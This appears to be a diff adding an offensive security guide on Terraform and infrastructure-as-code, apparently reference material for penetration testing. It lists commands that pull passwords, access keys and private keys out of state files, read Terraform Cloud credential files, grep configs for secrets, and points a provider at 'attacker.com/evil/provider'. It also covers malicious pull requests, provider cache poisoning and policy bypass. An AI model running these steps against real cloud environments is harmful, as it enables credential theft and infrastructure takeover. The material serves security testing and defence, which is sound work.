@@ -1,0 +1,252 @@
+<vulnerability_guide>
+  <title>TERRAFORM AND IAC SECURITY</title>
+
+  <critical>Terraform manages infrastructure as code, often with credentials capable of creating/destroying entire cloud environments. State files contain all secrets in plaintext, provider configurations may leak credentials, and CI/CD pipelines running Terraform are high-value targets.</critical>
+
+  <scope>
+    - State file exposure and secrets
+    - Provider credential leakage
+    - Backend configuration attacks
+    - Module supply chain risks
+    - CI/CD pipeline exploitation
+    - Drift and misconfiguration detection
+  </scope>
+
+  <methodology>
+    1. STATE FILE DISCOVERY
+       {% raw %}
+       # Local state files
+       find . -name "terraform.tfstate*"
+       find . -name "*.tfstate"
+
+       # Common exposed locations
+       # - S3 buckets (terraform-state-*)
+       # - Azure Storage (tfstate container)
+       # - GCS buckets
+       # - HTTP backends
+
+       # GitHub/GitLab search
+       filename:terraform.tfstate
+       filename:*.tfstate
+
+       # S3 bucket enumeration
+       aws s3 ls s3://company-terraform-state/
+
+       # State file contains ALL secrets in plaintext
+       # - Database passwords
+       # - API keys
+       # - TLS certificates
+       # - SSH keys
+       {% endraw %}
+
+    2. STATE FILE ANALYSIS
+       {% raw %}
+       # Parse state for secrets
+       cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'
+       cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.secret != null)'
+
+       # Extract specific resources
+       cat terraform.tfstate | jq '.resources[] | select(.type == "aws_db_instance")'
+       cat terraform.tfstate | jq '.resources[] | select(.type == "aws_iam_access_key")'
+
+       # Find sensitive outputs
+       cat terraform.tfstate | jq '.outputs'
+
+       # Common secrets in state:
+       # - aws_iam_access_key: access_key, secret_key
+       # - aws_db_instance: password
+       # - tls_private_key: private_key_pem
+       # - random_password: result
+       {% endraw %}
+
+    3. BACKEND EXPLOITATION
+       {% raw %}
+       # Check backend configuration
+       cat backend.tf
+
+       # S3 backend misconfigurations
+       # - Public bucket
+       # - Weak bucket policy
+       # - No encryption
+       # - No versioning (can't recover from attack)
+
+       # HTTP backend attacks
+       backend "http" {
+         address = "https://terraform.company.com/state"
+       }
+       # Test for auth bypass, SSRF, injection
+
+       # Remote backend token theft
+       cat ~/.terraform.d/credentials.tfrc.json
+       # Contains Terraform Cloud tokens
+       {% endraw %}
+
+    4. PROVIDER CREDENTIAL EXPOSURE
+       {% raw %}
+       # Hardcoded credentials in configs
+       grep -r "access_key" *.tf
+       grep -r "secret_key" *.tf
+       grep -r "password" *.tf
+       grep -r "token" *.tf
+
+       # Environment variable leakage
+       # TF_VAR_* variables
+       # AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
+       # GOOGLE_CREDENTIALS
+       # ARM_CLIENT_SECRET
+
+       # CI/CD logs may expose
+       terraform plan  # Shows resource values
+       TF_LOG=DEBUG terraform apply  # Verbose logging
+       {% endraw %}
+
+    5. MODULE SUPPLY CHAIN
+       {% raw %}
+       # Public module risks
+       module "vpc" {
+         source  = "terraform-aws-modules/vpc/aws"
+         version = "3.0.0"  # Could be compromised
+       }
+
+       # Private module registry access
+       terraform login
+       # Check for weak auth
+
+       # Module source manipulation
+       # Git source - branch/tag could change
+       module "exploit" {
+         source = "git::https://github.com/org/module.git"
+         # No version pin = latest always
+       }
+
+       # Local module path traversal
+       module "malicious" {
+         source = "../../../etc/passwd"  # May work in some versions
+       }
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <plan_output_exploitation>
+      {% raw %}
+      # terraform plan reveals planned changes
+      # May expose secrets before they're created
+
+      # Capture plan output
+      terraform plan -out=plan.bin
+      terraform show -json plan.bin > plan.json
+
+      # Plan file contains:
+      # - Values to be created
+      # - Computed secrets
+      # - Resource configurations
+
+      # Even "sensitive" values may be in plan
+      cat plan.json | jq '.resource_changes[].change.after'
+      {% endraw %}
+    </plan_output_exploitation>
+
+    <provider_plugin_attacks>
+      {% raw %}
+      # Custom provider risks
+      terraform {
+        required_providers {
+          malicious = {
+            source = "attacker.com/evil/provider"
+          }
+        }
+      }
+
+      # Provider cache poisoning
+      # ~/.terraform.d/plugins/
+      # Replace legitimate provider binary
+
+      # Provider plugin execution
+      # Providers run arbitrary code
+      # Compromise provider = full control
+      {% endraw %}
+    </provider_plugin_attacks>
+
+    <sentinel_policy_bypass>
+      {% raw %}
+      # Terraform Cloud/Enterprise use Sentinel policies
+      # May have bypass vectors
+
+      # Check policy enforcement level
+      # - advisory (warning only)
+      # - soft-mandatory (can override)
+      # - hard-mandatory (must pass)
+
+      # Policy bypass techniques:
+      # - Resource name manipulation
+      # - Tag-based policy evasion
+      # - Provider selection (different providers)
+      # - Workspace switching
+      {% endraw %}
+    </sentinel_policy_bypass>
+
+    <workspace_isolation_break>
+      {% raw %}
+      # Terraform workspaces may not be isolated
+
+      # Shared state backend
+      # Multiple workspaces, same S3 bucket
+      # Access one workspace, access all
+
+      # Terraform Cloud workspace access
+      curl -H "Authorization: Bearer $TFC_TOKEN" \
+        https://app.terraform.io/api/v2/organizations/org/workspaces
+
+      # List all accessible workspaces
+      terraform workspace list
+      {% endraw %}
+    </workspace_isolation_break>
+
+    <ci_cd_exploitation>
+      {% raw %}
+      # CI/CD running Terraform is high value
+
+      # GitHub Actions secrets
+      # - TF_API_TOKEN
+      # - AWS credentials
+      # - Provider secrets
+
+      # Malicious PR attack
+      # PR modifies .tf files
+      # Plan runs automatically
+      # Secrets logged or exfiltrated
+
+      # terraform init hook
+      # Can execute arbitrary code during init
+      # Post-init hook: locals.tf with external data source
+      {% endraw %}
+    </ci_cd_exploitation>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor state file access patterns
+    - Alert on state file downloads
+    - Track workspace and provider changes
+    - Audit plan output destinations
+    - Check for credential exposure in logs
+  </detection>
+
+  <validation>
+    - Locate and access state files
+    - Extract secrets from state
+    - Identify backend misconfigurations
+    - Find hardcoded credentials
+    - Demonstrate module supply chain risk
+  </validation>
+
+  <pro_tips>
+    - State files are gold mines - always check S3/GCS/Azure Storage
+    - Plan output in CI logs often contains secrets
+    - TF_LOG=DEBUG in CI pipelines is common and exposes everything
+    - .terraform directory contains cached providers and modules
+    - terraform.tfvars.json may be committed with secrets
+    - Check backup state files (.tfstate.backup)
+  </pro_tips>
+
+  <remember>Terraform state files contain EVERY secret in plaintext - database passwords, API keys, private keys, everything. Finding an exposed state file is equivalent to finding the keys to the kingdom. Always check S3 buckets, Git history, and CI/CD artifacts for state file exposure.</remember>
+</vulnerability_guide>
